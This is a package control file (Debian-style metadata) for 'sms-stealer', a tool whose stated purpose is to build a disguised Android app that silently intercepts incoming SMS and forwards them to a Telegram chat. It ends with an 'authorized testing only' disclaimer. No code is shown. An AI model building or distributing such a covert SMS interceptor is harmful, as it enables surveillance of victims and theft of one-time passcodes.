Package: sms-stealer
Version: 0.1.0
Architecture: all
Maintainer: Alienkrishn [Anon4You]
Depends: git, ruby, apkeditor, apksigner
Section: utils
Priority: optional
Homepage: https://github.com/Anon4You/sms-stealer
Description: Silent SMS interceptor via Telegram bot
 Builds a disguised Android WebView app that intercepts incoming
 SMS messages and forwards them to a Telegram chat. Useful for
 authorized security testing and educational purposes only.
